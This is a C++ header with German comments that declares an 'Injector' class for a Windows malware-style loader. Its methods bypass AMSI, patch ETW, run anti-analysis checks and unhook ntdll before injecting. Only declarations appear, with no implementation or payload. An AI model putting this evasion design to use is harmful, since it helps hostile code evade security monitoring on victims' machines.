#ifndef INJECTOR_H
#define INJECTOR_H

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <vector>

// NEU: Struktur, um die sauberen NTDLL-Handles zu kapseln
struct CleanNtdll {
    HMODULE hNtdll;      // Basisadresse des gemappten Views
    HANDLE  hMapping;    // Handle zum File-Mapping-Objekt
};

// Hauptklasse, die den Injektionsprozess orchesstriert.
class Injector {
public:
    Injector();
    ~Injector();
    void run();

    // Führt die Bypässe und Anti-Analyse-Prüfungen aus.
    // Gibt true zurück, wenn die Umgebung als sicher eingestuft wird.
    bool prepareEnvironment();

private:
    bool bypassAMSI();
    bool patchETW();
    bool checkAntiAnalysis();
    CleanNtdll unhookNtdll();
    void releaseNtdll(CleanNtdll& ntdllHandles);
};

#endif // INJECTOR_H 